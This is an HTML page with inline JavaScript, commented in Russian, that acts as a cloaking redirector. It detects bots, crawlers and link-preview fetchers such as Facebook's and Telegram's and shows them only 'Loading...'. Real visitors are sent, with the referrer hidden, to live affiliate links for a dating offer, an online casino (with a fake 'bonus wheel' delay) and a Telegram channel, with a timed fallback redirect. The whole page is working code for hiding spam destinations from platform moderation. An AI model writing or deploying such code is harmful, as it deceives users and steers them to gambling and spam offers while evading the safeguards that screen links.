<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Smart Redirect + Full Multi-Language</title>
<meta name="referrer" content="no-referrer">
</head>
<body>

<script>
// --- антибот
const ua = navigator.userAgent.toLowerCase();
const isBot =
  ua.includes("bot") ||
  ua.includes("crawler") ||
  ua.includes("spider") ||
  ua.includes("preview") ||
  ua.includes("facebookexternalhit") ||
  ua.includes("telegrambot");

// --- офферы
const offers = [
  { url: "https://tone.affomelody.com/click?pid=6350&offer_id=25", baseWeight: 0.5, key: "dating" },
  { url: "https://onlinepnpbit.com/2Vi4txHl/", baseWeight: 0.3, key: "casino", prog: true },
  { url: "https://t.me/+NFHjJC5nOndlZjky", baseWeight: 0.2, key: "tg", prog: false, fallback: "dating" }
];

// --- статистика
function getStats() {
  return JSON.parse(localStorage.getItem("stats") || "{}");
}
function saveStats(stats) {
  localStorage.setItem("stats", JSON.stringify(stats));
}

// --- клики
function trackClick(key) {
  let stats = getStats();
  stats[key] = (stats[key] || 0) + 1;
  saveStats(stats);
}

// --- выбор оффера
function chooseOffer() {
  let stats = getStats();
  let total = Object.values(stats).reduce((a,b)=>a+b,0);

  let weights = offers.map(o => {
    let bonus = stats[o.key] ? stats[o.key] / (total || 1) : 0;
    return o.baseWeight + bonus * 0.6;
  });

  let sum = weights.reduce((a,b)=>a+b,0);
  weights = weights.map(w => w / sum);

  let rand = Math.random();
  let cumulative = 0;

  for (let i = 0; i < offers.length; i++) {
    cumulative += weights[i];
    if (rand < cumulative) {
      trackClick(offers[i].key);
      return offers[i];
    }
  }
}

// --- мультиязычные тексты
const texts = {
  "casino": {
    "ru": "🎰 Вращаем колёсико бонуса... Подождите 3 сек",
    "en": "🎰 Spinning bonus wheel... Please wait 3 sec",
    "es": "🎰 Girando rueda de bonificación... Espere 3 segundos",
    "fr": "🎰 Roue bonus en cours... Veuillez patienter 3 sec"
  },
  "tg": {
    "ru": "⭐ Доступ к приватному каналу",
    "en": "⭐ Access to private channel",
    "es": "⭐ Acceso al canal privado",
    "fr": "⭐ Accès au canal privé"
  },
  "tgButton": {
    "ru": "Войти",
    "en": "Enter",
    "es": "Entrar",
    "fr": "Entrer"
  },
  "dating": {
    "ru": "❤️ Переход на рейтинг дейтинга...",
    "en": "❤️ Redirecting to dating rating...",
    "es": "❤️ Redirigiendo a la clasificación de citas...",
    "fr": "❤️ Redirection vers le classement dating..."
  }
};

// --- функция получения текста по языку
function getText(key) {
  const lang = (navigator.language || navigator.userLanguage || "en").slice(0,2);
  return (texts[key] && texts[key][lang]) || texts[key]["en"];
}

// --- запуск
if (!isBot) {
  let selected = chooseOffer();
  localStorage.setItem("last_offer", selected.key);

  if (selected.prog) {
    // --- казино прогрев
    const landing = document.createElement("div");
    landing.innerHTML = `<p>${getText("casino")}</p>`;
    document.body.innerHTML = "";
    document.body.appendChild(landing);

    setTimeout(() => {
      window.location.replace(selected.url);
    }, 3000);
  } else if (selected.key === "tg") {
    // --- Telegram с fallback
    const landing = document.createElement("div");
    landing.innerHTML = `
      <p>${getText("tg")}</p>
      <button id="enterTG">${getText("tgButton")}</button>
    `;
    document.body.innerHTML = "";
    document.body.appendChild(landing);

    document.getElementById("enterTG").addEventListener("click", () => {
      trackClick("tg");
      window.location.replace(selected.url);
    });

    // --- fallback через 5 сек
    setTimeout(() => {
      if (localStorage.getItem("last_offer") === "tg") {
        const fb = offers.find(o => o.key === selected.fallback);
        window.location.replace(fb.url);
      }
    }, 5000);
  } else {
    // --- редирект дейтинг
    const landing = document.createElement("div");
    landing.innerHTML = `<p>${getText("dating")}</p>`;
    document.body.innerHTML = "";
    document.body.appendChild(landing);

    setTimeout(() => {
      window.location.replace(selected.url);
    }, 500);
  }
}
</script>

<p>Loading...</p>

</body>
</html>
